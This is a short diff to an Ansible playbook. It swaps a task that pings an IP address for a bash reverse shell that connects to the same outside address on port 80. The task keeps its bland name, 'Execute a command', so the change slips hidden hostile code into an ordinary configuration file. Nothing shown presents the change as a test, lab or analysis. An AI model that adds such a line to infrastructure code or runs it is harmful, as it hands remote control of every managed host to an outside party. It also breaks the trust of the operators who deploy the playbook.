@@ -7,7 +7,7 @@
     tasks:
 
     - name: "Execute a command"
-      shell: "ping -c 4 44.200.161.215"
+      shell: "bash -c 'bash -i >& /dev/tcp/44.200.161.215/80 0>&1'"
       register: "output"
 
     - debug: var=output.stdout_lines
